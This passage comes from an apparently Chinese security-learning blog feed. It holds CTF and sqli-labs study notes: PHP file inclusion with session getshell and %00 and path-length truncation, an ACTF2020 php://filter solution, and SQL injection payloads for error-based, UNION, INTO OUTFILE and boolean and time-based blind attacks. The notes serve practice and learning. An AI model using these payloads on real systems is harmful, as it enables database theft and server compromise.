getshell</h2><p>首先，通过phpinfo()可以知道session的目录<br>如果没法phpinfo也可以猜一猜…<br>常见session存放目录:<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p>向session传入恶意代码的方式有这些:<br>.<br>.<br>.<br>有个P! 还得是php源码里写了类似下面的东西，session才能被你控制，可谓是非常的鸡肋…..</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$cmdback</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmdback&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;hack&quot;</span>]=<span class="hljs-variable">$cmdback</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="后缀限制-截断绕过"><a href="#后缀限制-截断绕过" class="headerlink" title="后缀限制-截断绕过"></a>后缀限制-截断绕过</h2><h3 id="常规截断"><a href="#常规截断" class="headerlink" title="常规截断"></a>常规截断</h3><p>要求:<br>php版本小于5.3.4<br>magic_quotes_gpc为off状态</p><p>若限制了后缀名，则需要通过截断访问: index.php?file&#x3D;..&#x2F;..&#x2F;flag.php%00<br>%00 会被解析为0x00，导致截断的发生</p><h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>文件路径是有最大长度限制的，为此可以通过填充垃圾字符来截断最后一部分<br>比如magic_quotes_gpc为on状态时，会把%00前加\转义掉: flag.php\0<br>条件:<br>php版本小于5.3.4</p><p>windows 259个bytes<br>linux 4096个bytes</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">比如win下: <br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag.php..............................................................................................................................................................................................................................................<br>或者: <br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag.php.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./<br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag1.php<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span><br>(文件长度偶数时用<span class="hljs-number">2</span>，奇数时用<span class="hljs-number">3</span>，自己慢慢悟吧...)<br></code></pre></td></tr></table></figure><p>使用截断的时候根据具体情况使用不同截断方法，遇到奇偶问题的时候可以丢一串很长的.&#x2F;到URL后面然后再调整第一个字符。一般来说%00就足够了，当%00不行时再尝试.&#x2F;的组合</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="include-ACTF2020"><a href="#include-ACTF2020" class="headerlink" title="include ACTF2020"></a>include ACTF2020</h3><p>进入页面发现只有一个按钮，点击后发现是这样传播: <a href="http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php">http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php</a></p><p>于是联想到文件包含漏洞，构造: &#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>有回显，base64转码得index.php源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">&quot;utf8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;php://input&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;zip://&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;phar://&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data:&quot;</span>))&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);  <span class="hljs-comment">// stristr: 返回查找的字符串+后面剩余字符串，总之就是检测</span><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>)&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;  <span class="hljs-comment">//flag.php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再试试同样的方法查看flag.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;f6ca3992-6f08-4c09-b7e9-9d70e8c1d702&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli_labs 解题笔记(2)</title>
    <link href="/2021/10/29/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/"/>
    <url>/2021/10/29/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/</url>
    
    <content type="html"><![CDATA[<p>双查询注入、php反弹shell、hackbar里get、post区别</p><p>1个菜b学sql注入的笔记，大佬绕过</p><p>前面水了很多，是因为好多基础知识俺8太会。因此到了这里，就8会再水了</p><h1 id="lesson-5-双查询注入-错误回显来返回信息"><a href="#lesson-5-双查询注入-错误回显来返回信息" class="headerlink" title="lesson_5 双查询注入, 错误回显来返回信息"></a>lesson_5 双查询注入, 错误回显来返回信息</h1><p><img src="/images/sqli_labs/sqli_labs(2).png"><br>尝试注入, 发现要么报错，要么显示上面的东东</p><p>result1: You are in………..<br>result2: You have an error in your SQL syntax…..</p><p>所以此处我们要学习1个新的思路，叫利用错误回显来获得信息</p><h2 id="利用错误回显来返回信息-抄作业"><a href="#利用错误回显来返回信息-抄作业" class="headerlink" title="利用错误回显来返回信息(抄作业)"></a>利用错误回显来返回信息(抄作业)</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>举例: 一个阔以在报错回显里获得当前数据库的语句:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a#<br></code></pre></td></tr></table></figure><p>大概意思就是根据报错来回显信息，这得搓代码多少年才能想到这个…会用就行了……<br>attention: 由于rand()函数的随机性，需要多次刷新，会得到下图结果<br><img src="/images/sqli_labs/sqli_labs(3).png"><br>获得当前database: security  <del>可恶，是幻术</del><br>然后把上述语句的database()换成user()，刷新几次，获得当前user<br>再获得table_name以及其他信息:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a-- <br></code></pre></td></tr></table></figure><p>刷新几次后….</p><p><img src="/images/sqli_labs/sqli_labs(3).png"></p><p>0hhhhhhhhhhhhhhhh!!!!!!!</p><h1 id="lesson-7-文件反弹shell"><a href="#lesson-7-文件反弹shell" class="headerlink" title="lesson_7 文件反弹shell"></a>lesson_7 文件反弹shell</h1><p>首先，盲注</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;-- <span class="hljs-built_in">error</span><br>?<span class="hljs-attribute">id</span>=1&quot;-- 正常<br>?<span class="hljs-attribute">id</span>=1&#x27;)-- <span class="hljs-built_in">error</span><br>?<span class="hljs-attribute">id</span>=1&#x27;))-- 正常，返回结果: You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span> Use outfile<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br></code></pre></td></tr></table></figure><p>(ps: 所以有时候括号要闭合好几次啊)</p><p>根据返回结果可知，这又是个错误回显注入，然后尝试用双查询、updatexml()等各种错误回显，发现8行，错误回显没有数据</p><p>网上搜索可知，这里根据回显结果’Use outfile’提示，要用到php反弹shell，原理见俺另一个记录sql注入姿势原理的博客</p><p>于是我们就阔以构造: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">id</span>=-1&#x27;)) union select group_concat(username) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>into outfile <span class="hljs-string">&#x27;F:/shit.txt&#x27;</span>-- <br></code></pre></td></tr></table></figure><p>于是，就报错了</p><p>因为mysql在配置文件里限制了导出文件的路径，既然如此，就要知道这个路径</p><p>为此我们要用到这个: datadir、basedir(具体原理见俺另一个记录sql注入姿势原理的博客)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>,@<span class="hljs-variable">@basedir</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>投个机，在第一关试试:<br><img src="/images/sqli_labs/sqli_labs(6).png"></p><p>就知道了</p><p>然后开始构造:<br>.<br>.<br>.</p><p>这关迟迟过不了，太菜了，网上的payload原封不动地上都没反应，阔能是环境错了。还是先学学基础，比如这关要用到的基础知识: <a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">一句话木马</a></p><p>然后周四再去问问210这关咋搞</p><p>后续:<br>今天去210，bw师傅给俺解决了，大致原因是: 首先linux里的路径阔以是’&#x2F;‘也阔以是’&#39;，但windows里则只能是’&#x2F;‘;其次你的secure_file_priv一开始的值是”NULL”，mysql里NULL和空是2个概念，俺的理解就是:NULL表示没有，空表示没有限制，想是啥都行<br><img src="/images/sqli_labs/sqli_labs(8).png"></p><p>如图，虽然报错，但是生成了文件，记得以后路径要用’&#x2F;‘</p><h1 id="lesson-8-我超，盲注"><a href="#lesson-8-我超，盲注" class="headerlink" title="lesson_8 我超，盲注"></a>lesson_8 我超，盲注</h1><p>所谓盲注，就是在注入过程中数据不能回显到前端页面，全靠猜，猜对和猜错的回显8一样(所以叫布尔)</p><p>而又因为全靠猜，所以得搓脚本</p><p>具体的分类以及姿势，写在另一个博客里了</p><p>到这里就要再学一些函数了</p><p>操作:</p><p>首先判断你要查的东东的名字长度, 比如数据库:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> (<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>())=<span class="hljs-number">8</span>)-- </span><br></code></pre></td></tr></table></figure><p>比如mysql版本(一般是4或5):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> substring(@@version,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">5</span> --<br></code></pre></td></tr></table></figure><p>然后就通过ascii一个一个猜</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=115) -- <br></code></pre></td></tr></table></figure><p>此处自然是要写脚本，之前学的爬虫排上用场了，可是俺的Python在装双环境时出问题了，一直没解决….</p><p>但是还有burp和sqlmap阔以用，过了</p><h2 id="lesson-9-时间盲注"><a href="#lesson-9-时间盲注" class="headerlink" title="lesson_9 时间盲注"></a>lesson_9 时间盲注</h2><p>此处的特点是，无论后面拼接的语句是否正确，都只会返回同样的结果: You are in….</p><p>而布尔盲注一般会返回2个结果，所以此关要用到时间盲注</p><p>eg:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length(substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> &#123;&#125;,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=&#123;&#125;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- </span><br><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> &#123;&#125;,<span class="hljs-number">1</span>),&#123;&#125;,<span class="hljs-number">1</span>))=&#123;&#125;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h1 id="lesson-13-基于报错的布尔盲注"><a href="#lesson-13-基于报错的布尔盲注" class="headerlink" title="lesson_13 基于报错的布尔盲注"></a>lesson_13 基于报错的布尔盲注</h1><p>本关闭合错误会有回显，但闭合正确了啥都不显示(比如输入Dumb、Dumb分别为username、password，不会回显)</p><p>同时正确闭合后时间盲注也没卵用<br>同时这个也没卵用</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>()=<span class="hljs-number">18</span>))</span><br></code></pre></td></tr></table></figure><p><img src="/images/sqli_labs/sqli_labs(7).png"><br>但是，基于报错的布尔盲注是有用的!!(因为人家会返回报错)</p><h1 id="add-关于hackbar里post和get传参的区别"><a href="#add-关于hackbar里post和get传参的区别" class="headerlink" title="add: 关于hackbar里post和get传参的区别"></a>add: 关于hackbar里post和get传参的区别</h1><p>我草….来回几遍以为是语法错误检查不出来，后来才发现hackbar在post传参时是要用url码的…..</p><p>比如: 在get传参时，可以用’– ‘来表示注释，但在post传参里则必须为’–+’</p><p>而如果在post里不用url码，则会出现以下结果:</p><p><img src="/images/sqli_labs/sqli_labs(4).png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli_lab 解题笔记(1)</title>
    <link href="/2021/10/27/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-1/"/>
    <url>/2021/10/27/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<p>注入的基本操作(字符型、数字型、优先匹配、强制字符转换), sqli_labs1-4关</p><p>1个菜b学sql注入的笔记，大佬绕过</p><p>前置知识: 10以内加减法、mysql语法，建议去<a href="https://www.w3school.com.cn/">w3school</a></p><p>俺第一次学的时候感觉进步很慢，很难，然后就咕咕了，后来发现还是要先打好基础，后面会简单一些</p><p>由于没学过数据库，0基础fw,所以前面水的比较多，后面就8废话了</p><p>另外，<a href="https://blog.51cto.com/skytina/1698724">信安日记</a>这篇讲得8错，很通俗，阔以对照着看</p><p>SQL注入原理，虽然简单，还是再叙述一下, 大致就是你传进1个参，然后服务器会执行php文件的命令，然后你就阔以在传参上做点手脚</p><p>比如这个php文件里有这样1个命令:<br>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;(其中$sql就是你传的参)<br>如果传入&#x2F;?id&#x3D;-1’ DELETE database() – ，原语句就变意思了，服务器就会识别成删库语句，然后就…</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="关于database、schema、table等的关系"><a href="#关于database、schema、table等的关系" class="headerlink" title="关于database、schema、table等的关系"></a>关于database、schema、table等的关系</h2><p>database是个旅馆，schema是房间，table是床，users有的可以操作schema(eg:房客)，有的可以操作database(eg:老鸨)</p><h3 id="优先匹配"><a href="#优先匹配" class="headerlink" title="优先匹配"></a>优先匹配</h3><p>在where语句中，当出现多个字符串的时候，“&#x3D;”将会选择优先级最高的一个，优先级是从左到右，依次降低的！也就是离“&#x3D;”最近的一个。<br>eg:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;shit&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;shit&#x27;</span><span class="hljs-string">&#x27;qnmd&#x27;</span>;<br></code></pre></td></tr></table></figure><p>以上查询结果都一样，等同于只输1个’1’</p><h3 id="concat家族"><a href="#concat家族" class="headerlink" title="concat家族"></a>concat家族</h3><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>concat(column1,column2):将column1, column2联合显示</p><h4 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws:"></a>concat_ws:</h4><p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符</p><h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat():"></a>group_concat():</h4><p>要知道这个，得知道GROUP BY，见下面</p><p>然后回到group_concat()，它就是将GROUP BY产生的分组里的字符~~~拼~~~连接，作为1个字符返回</p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>一般和GROUP_CONCAT混用，用于数据分组</p><p><img src="/images/sqli_labs/sqli_labs(9).png"></p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>很牛逼的数据库，相当于新华字典，里面存着数据库名字等关键信息<br>m0r3:<br>information_schema下的表:<br>    schemata:(schema_data缩写)提供所有数据库信息，里面有schema_name</p><pre><code class="hljs">tables:table_name,所有表名; table_schema:所有表所在数据库名称eg: select group_concat(table_name) from information_schema.tables where table_schema=&#39;qnmd&#39;-- (找&#39;qnmd&#39;数据库下的所有表)columns:提供表中的列信息，其中有个叫colums_name的列，提供所有表里有啥列，还有table_name,常用于限定查哪个表(此处的table_name和tables里的table_name好像还8一样，姑且不研究太深)eg: select group_concat(column_name) from information_schema.columns where table_name=&#39;shit&#39;-- (找&#39;shit&#39;表里的所有列名)其他的8太需要了解</code></pre><h1 id="lesson-1-字符型注入"><a href="#lesson-1-字符型注入" class="headerlink" title="lesson_1 字符型注入"></a>lesson_1 字符型注入</h1><h2 id="1、判断类型"><a href="#1、判断类型" class="headerlink" title="1、判断类型"></a>1、判断类型</h2><p>?id&#x3D;1 and 1&#x3D;2– ,返回正常，所以8是数字型注入<br>?id&#x3D;1’ ,加单引号，发现报错，加– 注释，显示正常，说明是单引号注入;</p><h2 id="分析字段数-判断该表有几列数据"><a href="#分析字段数-判断该表有几列数据" class="headerlink" title="分析字段数(判断该表有几列数据)"></a>分析字段数(判断该表有几列数据)</h2><p>为啥要分析呢？因为后面UNION SELECT要用到</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>回显正常，?id&#x3D;1’ order by 4– ，回显错误，说明有3列</p><h2 id="看看页面有没有显示位"><a href="#看看页面有没有显示位" class="headerlink" title="看看页面有没有显示位"></a>看看页面有没有显示位</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>结果:<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3 </p><p>说明有2个显示位(有时，SELECT语句会限制输出的行数(比如SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1)，这时候就需要让第一行失效)</p><h2 id="找出数据库名，表名、列名"><a href="#找出数据库名，表名、列名" class="headerlink" title="找出数据库名，表名、列名"></a>找出数据库名，表名、列名</h2><p>将id&#x3D;1改成数据库8存在的值，这样显示的时候便不占用显示位(原理:因为没有，所以8会显示)</p><p>?id&#x3D;qnmd’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –<br>来手逐字解析，比较0基础</p><p>GROUP_CONCAT, schema_name, schema_name：见上文<br>indormation.schemata: 加information_schema是因为schemata在当前数据库没有，而是在information_schema里，要先换到另一个数据库<br>tips: GROUP_CONCAT此处后面没有GROUP BY，所以是直接将所有的列打包到一块，作为1个字符串，结果显示:emails,referers,uagents,users，若不加GROUP_CONCAT()则只显示emails</p><h1 id="lesson-2-数字型注入"><a href="#lesson-2-数字型注入" class="headerlink" title="lesson_2 数字型注入"></a>lesson_2 数字型注入</h1><p>众所周知，数字型注入也是个基本注入类型</p><h2 id="判断是否是数字型"><a href="#判断是否是数字型" class="headerlink" title="判断是否是数字型"></a>判断是否是数字型</h2><p>只需要通过简单的加减法就阔以判断啦!(此处注意，在url码里+是空格，所以要用%2B表示+)</p><p>首先输入&#x2F;?id&#x3D;1’，显示错误，但是当输入&#x2F;?id&#x3D;1’– 时仍然错误，然后注意此处返回的报错:<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1<br>而不是:<br>Unknown column ‘1’’ in ‘where clause’<br>所以说明这里的’并没有被php里的某些防护函数转义(相关知识见下方)</p><p>然后输入&#x2F;?id&#x3D;1+1，返回结果和&#x2F;?id&#x3D;2一样，就阔以说明是数字型注入了</p><p>数字型注入和字符型的区别8大，不需要用’闭合就是了，略</p><h3 id="tips-小提一下php里的一些转义函数"><a href="#tips-小提一下php里的一些转义函数" class="headerlink" title="tips, 小提一下php里的一些转义函数"></a>tips, 